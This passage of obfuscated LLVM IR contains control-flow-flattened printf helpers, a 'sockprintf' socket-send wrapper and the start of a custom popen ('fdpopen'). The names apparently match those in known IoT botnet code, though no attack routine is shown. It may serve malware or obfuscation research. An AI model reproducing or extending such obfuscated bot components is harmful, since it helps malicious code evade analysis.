  %277 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %276, i8* %277, align 1
  %278 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %278, align 1
  %279 = load i8**, i8*** %4, align 8
  %280 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %281 = load i32, i32* %7, align 4
  %282 = load i32, i32* %8, align 4
  %283 = call i32 @prints(i8** %279, i8* %280, i32 %281, i32 %282)
  %284 = load i32, i32* %9, align 4
  %285 = add nsw i32 %284, %283
  store i32 %285, i32* %9, align 4
  store i32 2061845075, i32* %switchVar
  br label %loopEnd

; <label>:286:                                    ; preds = %loopEntry
  store i32 -283315045, i32* %switchVar
  br label %loopEnd

; <label>:287:                                    ; preds = %loopEntry
  store i32 -1880010896, i32* %switchVar
  br label %loopEnd

; <label>:288:                                    ; preds = %loopEntry
  %289 = load i8**, i8*** %4, align 8
  %290 = load i8*, i8** %5, align 8
  %291 = load i8, i8* %290, align 1
  %292 = zext i8 %291 to i32
  call void @printchar(i8** %289, i32 %292)
  %293 = load i32, i32* %9, align 4
  %294 = add nsw i32 %293, 1
  store i32 %294, i32* %9, align 4
  store i32 -283315045, i32* %switchVar
  br label %loopEnd

; <label>:295:                                    ; preds = %loopEntry
  store i32 2061845075, i32* %switchVar
  br label %loopEnd

; <label>:296:                                    ; preds = %loopEntry
  %297 = load i8*, i8** %5, align 8
  %298 = getelementptr inbounds i8, i8* %297, i32 1
  store i8* %298, i8** %5, align 8
  store i32 1778847529, i32* %switchVar
  br label %loopEnd

; <label>:299:                                    ; preds = %loopEntry
  %300 = load i8**, i8*** %4, align 8
  %301 = icmp ne i8** %300, null
  %302 = select i1 %301, i32 688761015, i32 -1705659499
  store i32 %302, i32* %switchVar
  br label %loopEnd

; <label>:303:                                    ; preds = %loopEntry
  %304 = load i8**, i8*** %4, align 8
  %305 = load i8*, i8** %304, align 8
  store i8 0, i8* %305, align 1
  store i32 -1705659499, i32* %switchVar
  br label %loopEnd

; <label>:306:                                    ; preds = %loopEntry
  %307 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %308 = bitcast %struct.__va_list_tag* %307 to i8*
  call void @llvm.va_end(i8* %308)
  %309 = load i32, i32* %9, align 4
  ret i32 %309

loopEnd:                                          ; preds = %303, %299, %296, %295, %288, %287, %286, %274, %269, %263, %257, %251, %244, %239, %233, %226, %220, %213, %208, %202, %195, %189, %182, %177, %171, %164, %158, %151, %146, %140, %133, %127, %121, %120, %118, %110, %105, %99, %93, %87, %84, %75, %73, %68, %62, %61, %56, %50, %49, %46, %40, %39, %33, %32, %24, %18, %12, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  store i32 %13, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1156240757, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1156240757, label %first
    i32 -979936842, label %16
    i32 -2071355215, label %18
    i32 -1022816481, label %23
    i32 -1832503377, label %26
    i32 -1878742152, label %29
    i32 -1332049421, label %34
    i32 -277389117, label %35
    i32 -195435068, label %39
    i32 -1595093972, label %44
    i32 -561801395, label %45
    i32 385804429, label %46
    i32 -333154375, label %51
    i32 1372643304, label %52
    i32 622436230, label %56
    i32 1184960553, label %61
    i32 160209686, label %64
    i32 1609883453, label %65
    i32 -476312020, label %66
    i32 -175327199, label %71
    i32 1022648059, label %78
    i32 -1941375458, label %81
    i32 -1075058849, label %82
    i32 435703918, label %86
    i32 -1831896284, label %91
    i32 -1547482723, label %94
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %14 = icmp sgt i32 %.reload, 0
  %15 = select i1 %14, i32 -979936842, i32 385804429
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  %17 = load i8*, i8** %6, align 8
  store i8* %17, i8** %12, align 8
  store i32 -2071355215, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %12, align 8
  %20 = load i8, i8* %19, align 1
  %21 = icmp ne i8 %20, 0
  %22 = select i1 %21, i32 -1022816481, i32 -1878742152
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %11, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %11, align 4
  store i32 -1832503377, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load i8*, i8** %12, align 8
  %28 = getelementptr inbounds i8, i8* %27, i32 1
  store i8* %28, i8** %12, align 8
  store i32 -2071355215, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i32, i32* %11, align 4
  %31 = load i32, i32* %7, align 4
  %32 = icmp sge i32 %30, %31
  %33 = select i1 %32, i32 -1332049421, i32 -277389117
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i32 0, i32* %7, align 4
  store i32 -195435068, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %11, align 4
  %37 = load i32, i32* %7, align 4
  %38 = sub nsw i32 %37, %36
  store i32 %38, i32* %7, align 4
  store i32 -195435068, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %8, align 4
  %41 = and i32 %40, 2
  %42 = icmp ne i32 %41, 0
  %43 = select i1 %42, i32 -1595093972, i32 -561801395
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  store i32 48, i32* %10, align 4
  store i32 -561801395, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  store i32 385804429, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i32, i32* %8, align 4
  %48 = and i32 %47, 1
  %49 = icmp ne i32 %48, 0
  %50 = select i1 %49, i32 1609883453, i32 -333154375
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  store i32 1372643304, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %7, align 4
  %54 = icmp sgt i32 %53, 0
  %55 = select i1 %54, i32 622436230, i32 160209686
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = load i8**, i8*** %5, align 8
  %58 = load i32, i32* %10, align 4
  call void @printchar(i8** %57, i32 %58)
  %59 = load i32, i32* %9, align 4
  %60 = add nsw i32 %59, 1
  store i32 %60, i32* %9, align 4
  store i32 1184960553, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i32, i32* %7, align 4
  %63 = add nsw i32 %62, -1
  store i32 %63, i32* %7, align 4
  store i32 1372643304, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  store i32 1609883453, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  store i32 -476312020, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i8*, i8** %6, align 8
  %68 = load i8, i8* %67, align 1
  %69 = icmp ne i8 %68, 0
  %70 = select i1 %69, i32 -175327199, i32 -1941375458
  store i32 %70, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i8**, i8*** %5, align 8
  %73 = load i8*, i8** %6, align 8
  %74 = load i8, i8* %73, align 1
  %75 = zext i8 %74 to i32
  call void @printchar(i8** %72, i32 %75)
  %76 = load i32, i32* %9, align 4
  %77 = add nsw i32 %76, 1
  store i32 %77, i32* %9, align 4
  store i32 1022648059, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i8*, i8** %6, align 8
  %80 = getelementptr inbounds i8, i8* %79, i32 1
  store i8* %80, i8** %6, align 8
  store i32 -476312020, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  store i32 -1075058849, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i32, i32* %7, align 4
  %84 = icmp sgt i32 %83, 0
  %85 = select i1 %84, i32 435703918, i32 -1547482723
  store i32 %85, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i8**, i8*** %5, align 8
  %88 = load i32, i32* %10, align 4
  call void @printchar(i8** %87, i32 %88)
  %89 = load i32, i32* %9, align 4
  %90 = add nsw i32 %89, 1
  store i32 %90, i32* %9, align 4
  store i32 -1831896284, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i32, i32* %7, align 4
  %93 = add nsw i32 %92, -1
  store i32 %93, i32* %7, align 4
  store i32 -1075058849, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i32, i32* %9, align 4
  ret i32 %95

loopEnd:                                          ; preds = %91, %86, %82, %81, %78, %71, %66, %65, %64, %61, %56, %52, %51, %46, %45, %44, %39, %35, %34, %29, %26, %23, %18, %16, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %.reg2mem = alloca i32
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  store i32 %23, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -2036861584, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %7
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -2036861584, label %first
    i32 -1424856335, label %26
    i32 -542245598, label %34
    i32 1622080950, label %38
    i32 1893048543, label %42
    i32 -2037965001, label %46
    i32 1030838893, label %49
    i32 845202673, label %54
    i32 -585503919, label %58
    i32 -1975396619, label %65
    i32 1004885787, label %71
    i32 -313259000, label %80
    i32 613044994, label %84
    i32 -2119697284, label %88
    i32 -1809538699, label %93
    i32 -1042862824, label %99
    i32 -1841816896, label %102
    i32 1863709418, label %103
    i32 1803386288, label %111
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %24 = icmp eq i32 %.reload, 0
  %25 = select i1 %24, i32 -1424856335, i32 -542245598
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %27, align 1
  %28 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %28, align 1
  %29 = load i8**, i8*** %9, align 8
  %30 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %31 = load i32, i32* %13, align 4
  %32 = load i32, i32* %14, align 4
  %33 = call i32 @prints(i8** %29, i8* %30, i32 %31, i32 %32)
  store i32 %33, i32* %8, align 4
  store i32 1803386288, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  %35 = load i32, i32* %12, align 4
  %36 = icmp ne i32 %35, 0
  %37 = select i1 %36, i32 1622080950, i32 1030838893
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = load i32, i32* %11, align 4
  %40 = icmp eq i32 %39, 10
  %41 = select i1 %40, i32 1893048543, i32 1030838893
  store i32 %41, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i32, i32* %10, align 4
  %44 = icmp slt i32 %43, 0
  %45 = select i1 %44, i32 -2037965001, i32 1030838893
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i32 1, i32* %19, align 4
  %47 = load i32, i32* %10, align 4
  %48 = sub nsw i32 0, %47
  store i32 %48, i32* %21, align 4
  store i32 1030838893, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %51 = getelementptr inbounds i8, i8* %50, i64 12
  %52 = getelementptr inbounds i8, i8* %51, i64 -1
  store i8* %52, i8** %17, align 8
  %53 = load i8*, i8** %17, align 8
  store i8 0, i8* %53, align 1
  store i32 845202673, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i32, i32* %21, align 4
  %56 = icmp ne i32 %55, 0
  %57 = select i1 %56, i32 -585503919, i32 -313259000
  store i32 %57, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i32, i32* %21, align 4
  %60 = load i32, i32* %11, align 4
  %61 = urem i32 %59, %60
  store i32 %61, i32* %18, align 4
  %62 = load i32, i32* %18, align 4
  %63 = icmp sge i32 %62, 10
  %64 = select i1 %63, i32 -1975396619, i32 1004885787
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i32, i32* %15, align 4
  %67 = sub nsw i32 %66, 48
  %68 = sub nsw i32 %67, 10
  %69 = load i32, i32* %18, align 4
  %70 = add nsw i32 %69, %68
  store i32 %70, i32* %18, align 4
  store i32 1004885787, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %18, align 4
  %73 = add nsw i32 %72, 48
  %74 = trunc i32 %73 to i8
  %75 = load i8*, i8** %17, align 8
  %76 = getelementptr inbounds i8, i8* %75, i32 -1
  store i8* %76, i8** %17, align 8
  store i8 %74, i8* %76, align 1
  %77 = load i32, i32* %11, align 4
  %78 = load i32, i32* %21, align 4
  %79 = udiv i32 %78, %77
  store i32 %79, i32* %21, align 4
  store i32 845202673, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  %81 = load i32, i32* %19, align 4
  %82 = icmp ne i32 %81, 0
  %83 = select i1 %82, i32 613044994, i32 1863709418
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %13, align 4
  %86 = icmp ne i32 %85, 0
  %87 = select i1 %86, i32 -2119697284, i32 -1042862824
  store i32 %87, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = load i32, i32* %14, align 4
  %90 = and i32 %89, 2
  %91 = icmp ne i32 %90, 0
  %92 = select i1 %91, i32 -1809538699, i32 -1042862824
  store i32 %92, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %94, i32 45)
  %95 = load i32, i32* %20, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %20, align 4
  %97 = load i32, i32* %13, align 4
  %98 = add nsw i32 %97, -1
  store i32 %98, i32* %13, align 4
  store i32 -1841816896, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i8*, i8** %17, align 8
  %101 = getelementptr inbounds i8, i8* %100, i32 -1
  store i8* %101, i8** %17, align 8
  store i8 45, i8* %101, align 1
  store i32 -1841816896, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  store i32 1863709418, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = load i32, i32* %20, align 4
  %105 = load i8**, i8*** %9, align 8
  %106 = load i8*, i8** %17, align 8
  %107 = load i32, i32* %13, align 4
  %108 = load i32, i32* %14, align 4
  %109 = call i32 @prints(i8** %105, i8* %106, i32 %107, i32 %108)
  %110 = add nsw i32 %104, %109
  store i32 %110, i32* %8, align 4
  store i32 1803386288, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i32, i32* %8, align 4
  ret i32 %112

loopEnd:                                          ; preds = %103, %102, %99, %93, %88, %84, %80, %71, %65, %58, %54, %49, %46, %42, %38, %34, %26, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %.reg2mem = alloca i8**
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  store i8** %5, i8*** %.reg2mem
  %switchVar = alloca i32
  store i32 -1396585324, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1396585324, label %first
    i32 -1355498519, label %8
    i32 454244841, label %16
    i32 257847481, label %19
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i8**, i8*** %.reg2mem
  %6 = icmp ne i8** %.reload, null
  %7 = select i1 %6, i32 -1355498519, i32 454244841
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* %4, align 4
  %10 = trunc i32 %9 to i8
  %11 = load i8**, i8*** %3, align 8
  %12 = load i8*, i8** %11, align 8
  store i8 %10, i8* %12, align 1
  %13 = load i8**, i8*** %3, align 8
  %14 = load i8*, i8** %13, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %13, align 8
  store i32 257847481, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = bitcast i32* %4 to i8*
  %18 = call i64 @write(i32 1, i8* %17, i64 1)
  store i32 257847481, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %16, %8, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #2

declare i64 @write(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #2
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #10
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i8*, i8** %6, align 8
  %24 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.38, i32 0, i32 0), i8* %23)
  %25 = load i32, i32* %3, align 4
  %26 = load i8*, i8** %6, align 8
  %27 = load i8*, i8** %6, align 8
  %28 = call i64 @strlen(i8* %27) #10
  %29 = call i64 @send(i32 %25, i8* %26, i64 %28, i32 16384)
  %30 = trunc i64 %29 to i32
  store i32 %30, i32* %8, align 4
  %31 = load i8*, i8** %6, align 8
  call void @free(i8* %31) #2
  %32 = load i32, i32* %8, align 4
  ret i32 %32
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: nounwind
declare void @free(i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8*) #0 {
  %.reg2mem4 = alloca i32
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [2 x i32], align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1532131799, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar3 = load i32, i32* %switchVar
  switch i32 %switchVar3, label %switchDefault [
    i32 -1532131799, label %first
    i32 1010450981, label %15
    i32 903955647, label %21
    i32 -589161076, label %28
    i32 -982698, label %29
    i32 -1818549142, label %34
    i32 367336902, label %35
    i32 367574697, label %39
    i32 695015426, label %43
    i32 536814632, label %44
    i32 1220493961, label %54
    i32 1626688448, label %55
    i32 1254299835, label %61
    i32 1437899367, label %NodeBlock
    i32 1890571067, label %LeafBlock1
    i32 -1858186376, label %LeafBlock
    i32 -162527278, label %66
    i32 -987259441, label %73
    i32 -782700295, label %79
    i32 -705124330, label %84
    i32 -1185788217, label %91
    i32 1578535760, label %95
    i32 -1767667022, label %100
    i32 521537705, label %107
    i32 1994275162, label %111
    i32 199236213, label %NewDefault
    i32 -800265587, label %114
    i32 -1313857078, label %120
    i32 -80207351, label %126
    i32 680110913, label %132
    i32 -772679943, label %139
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %13 = icmp ne i32 %.reload, 114
  %14 = select i1 %13, i32 1010450981, i32 903955647
  store i32 %14, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load i8*, i8** %5, align 8
  %17 = load i8, i8* %16, align 1
  %18 = zext i8 %17 to i32
  %19 = icmp ne i32 %18, 119
  %20 = select i1 %19, i32 -589161076, i32 903955647
  store i32 %20, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = load i8*, i8** %5, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 1
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp ne i32 %25, 0
  %27 = select i1 %26, i32 -589161076, i32 -982698
  store i32 %27, i32* %switchVar
  br label %loopEnd

; <label>:28:                                     ; preds = %loopEntry
  store i32 -1, i32* %3, align 4
  store i32 -772679943, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i32 0, i32 0
  %31 = call i32 @pipe(i32* %30) #2
  %32 = icmp slt i32 %31, 0
  %33 = select i1 %32, i32 -1818549142, i32 367336902
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i32 -1, i32* %3, align 4
  store i32 -772679943, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32*, i32** @fdopen_pids, align 8
  %37 = icmp eq i32* %36, null
  %38 = select i1 %37, i32 367574697, i32 1254299835
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = call i32 @getdtablesize() #2
  store i32 %40, i32* %8, align 4
  %41 = icmp sle i32 %40, 0
  %42 = select i1 %41, i32 695015426, i32 536814632
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  store i32 -1, i32* %3, align 4
  store i32 -772679943, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i32, i32* %8, align 4
  %46 = sext i32 %45 to i64
  %47 = mul i64 %46, 4
  %48 = trunc i64 %47 to i32
  %49 = zext i32 %48 to i64
  %50 = call noalias i8* @malloc(i64 %49) #2
  %51 = bitcast i8* %50 to i32*
  store i32* %51, i32** @fdopen_pids, align 8
  %52 = icmp eq i32* %51, null
  %53 = select i1 %52, i32 1220493961, i32 1626688448
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  store i32 -1, i32* %3, align 4
  store i32 -772679943, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i32*, i32** @fdopen_pids, align 8
  %57 = bitcast i32* %56 to i8*
  %58 = load i32, i32* %8, align 4
  %59 = sext i32 %58 to i64
  %60 = mul i64 %59, 4
  call void @llvm.memset.p0i8.i64(i8* %57, i8 0, i64 %60, i32 1, i1 false)
  store i32 1254299835, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = call i32 @vfork() #11
  store i32 %62, i32* %.reg2mem4
  %.reload8 = load volatile i32, i32* %.reg2mem4
  store i32 %.reload8, i32* %9, align 4
  store i32 1437899367, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload7 = load volatile i32, i32* %.reg2mem4
  %Pivot = icmp slt i32 %.reload7, 0
  %63 = select i1 %Pivot, i32 -1858186376, i32 1890571067
  store i32 %63, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload5 = load volatile i32, i32* %.reg2mem4
  %SwitchLeaf2 = icmp eq i32 %.reload5, 0
  %64 = select i1 %SwitchLeaf2, i32 -987259441, i32 199236213
  store i32 %64, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload6 = load volatile i32, i32* %.reg2mem4
  %SwitchLeaf = icmp eq i32 %.reload6, -1
  %65 = select i1 %SwitchLeaf, i32 -162527278, i32 199236213
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %68 = load i32, i32* %67, align 4
  %69 = call i32 @close(i32 %68)
  %70 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %71 = load i32, i32* %70, align 4
  %72 = call i32 @close(i32 %71)
  store i32 -1, i32* %3, align 4
  store i32 -772679943, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = load i8*, i8** %5, align 8
  %75 = load i8, i8* %74, align 1
  %76 = zext i8 %75 to i32
  %77 = icmp eq i32 %76, 114
  %78 = select i1 %77, i32 -782700295, i32 1578535760
  store i32 %78, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %81 = load i32, i32* %80, align 4
